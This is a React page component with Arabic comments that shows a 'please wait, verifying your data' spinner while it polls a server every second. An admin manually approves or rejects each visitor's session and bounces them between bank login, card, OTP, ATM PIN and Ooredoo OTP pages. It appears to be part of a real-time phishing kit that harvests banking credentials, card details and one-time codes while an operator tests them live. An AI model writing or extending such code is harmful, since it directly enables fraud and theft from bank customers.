import { useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Loader2 } from "lucide-react";

export default function WaitingPage() {
  const { t } = useLanguage();
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const sessionId = params.get("session");
  const nextStep = params.get("next");
  const bank = params.get("bank");

  // التحديث كل ثانية واحدة كما طلب المستخدم للمتابعة اللحظية
  const { data: sessionStatus } = trpc.submissions.getSessionStatus.useQuery(sessionId || "", {
    enabled: !!sessionId,
    refetchInterval: 1000, 
  });

  useEffect(() => {
    if (!sessionStatus) return;

    // 1. التحقق من وجود توجيه يدوي من الآدمن أولاً
    if (sessionStatus.redirectTarget) {
      // redirectTarget قد يبدأ بـ / أو بدونها
      const target = sessionStatus.redirectTarget.startsWith('/') ? sessionStatus.redirectTarget : `/${sessionStatus.redirectTarget}`;
      setLocation(`${target}?bank=${bank}&session=${sessionId}`);
      return;
    }

    // 2. التحقق من قرار الآدمن (قبول أو رفض)
    if (sessionStatus.adminAction === "approve") {
      setLocation(`/${nextStep}?bank=${bank}&session=${sessionId}`);
    } else if (sessionStatus.adminAction === "reject") {
      const currentStep = sessionStatus.currentStep;
      let backUrl = "";
      
      // تحديد الصفحة التي يعود إليها العميل بناءً على المرحلة الحالية
      if (currentStep === "login" || currentStep?.startsWith("card-")) backUrl = "/login-method";
      else if (currentStep === "registration-completion") backUrl = "/registration-completion";
      else if (currentStep === "otp") backUrl = "/otp";
      else if (currentStep === "atm") backUrl = "/atm-pin";
      else if (currentStep === "ooredoo") backUrl = "/ooredoo";
      else if (currentStep === "otp_ooredoo") backUrl = "/otp-ooredoo";
      else backUrl = "/login-method"; // افتراضي
      
      // العودة مع إشارة لوجود خطأ
      setLocation(`${backUrl}?bank=${bank}&session=${sessionId}&error=true`);
    }
  }, [sessionStatus, setLocation, nextStep, bank, sessionId]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white p-4 text-center">
      <Loader2 className="w-16 h-16 text-red-600 animate-spin mb-6" />
      <h2 className="text-2xl font-bold mb-2">{t("loading") || "يرجى الانتظار"}</h2>
      <p className="text-gray-600 max-w-xs mx-auto">
        يرجى الانتظار، جاري معالجة طلبك والتحقق من البيانات...
      </p>
    </div>
  );
}
